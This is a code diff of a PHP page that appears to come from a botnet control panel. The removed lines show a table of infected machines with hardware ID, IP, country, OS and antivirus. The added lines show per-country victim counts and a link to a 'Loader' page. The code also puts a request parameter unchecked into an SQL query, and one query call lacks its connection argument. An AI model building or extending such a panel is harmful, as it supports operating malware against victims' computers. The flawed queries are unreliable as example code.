@@ -27,8 +27,8 @@ include('protect.php');
         
             <div class="container-fluid" style = "background-color: #ffffff">               
                 <ul class="nav navbar-nav">
-				<li><a href="loader.php" style="color: black">Loader</a></li>
-                    <li><a href="Countries.php" style="color: black">Statistic</a></li>
+				<li><a href="Table.php" style="color: black">Panel</a></li>
+                    <li><a href="loader.php" style="color: black">Loader</a></li>
 				<li><a href="logout.php" style="color: black">Logout</a></li>
                 
                 </ul>
@@ -58,12 +58,9 @@ include('protect.php');
             <table class="table table-bordered">
                 <thead>
                 <tr>
-                    <th style="color: black">ID</th>
-                    <th style="color: black">HWID</th>
-                    <th style="color: black">IP</th>
                     <th style="color: black">Country</th>
-                    <th style="color: black">OS</th>
-                    <th style="color: black">AV</th>
+                    <th style="color: black">Value</th>
+                    <th style="color: black">%</th>
                 </tr>					
                 </thead>
                 <tbody>
@@ -74,10 +71,10 @@ include('protect.php');
                         if(isset($_GET['p'])){
                             $p1 = $_GET['p'];
                             $t1 = $_GET['p'] * 10;
-                            $workers = mysqli_query("SELECT * FROM `bots` WHERE `checked` != 'true' ORDER BY `id` DESC LIMIT $t1, 10");
+                            $workers = mysqli_query("SELECT * FROM `countries` ORDER BY `country` DESC LIMIT $t1, 10");
                         }
                         else{
-                            $workers = mysqli_query($mysqli, "SELECT * FROM `bots` WHERE `checked` != 'true' ORDER BY `id` DESC LIMIT 10");
+                            $workers = mysqli_query($mysqli, "SELECT * FROM `countries` ORDER BY `country` DESC LIMIT 10");
                         }
                         
                         for ($i = 0; $i < mysqli_num_rows($workers); $i++)
@@ -87,16 +84,13 @@ include('protect.php');
                             echo
                             "
                             <tr style=\"background-color: #ffffff; opacity: 0.9;\">
-                            <td><strong>".$curr['id']."</strong></td>
-                            <td><strong>".$curr['hwid']."</strong></td>
-                            <td><strong>".$curr['ip']."</strong></td>
-                            <td><strong>".$curr['country']."</strong></td> 
-                            <td><strong>".$curr['OS']."</strong></td>
-                            <td><strong>".$curr['AV']."</strong></td>  
+                            <td><strong>".$curr['country']."</strong></td>
+                            <td><strong>".$curr['value']."</strong></td>
+                            <td><strong>".$curr['value'] / $logs * 100 ."</strong></td>
                             </tr>
                             ";
                         }
-                         if(mysqli_num_rows(mysqli_query($mysqli, "SELECT * FROM `bots`")) > 10){
+                         if(mysqli_num_rows(mysqli_query($mysqli, "SELECT * FROM `countries`")) > 10){
                             $p11 = $p1 - 1;
                             $p1 += 1;
                             echo
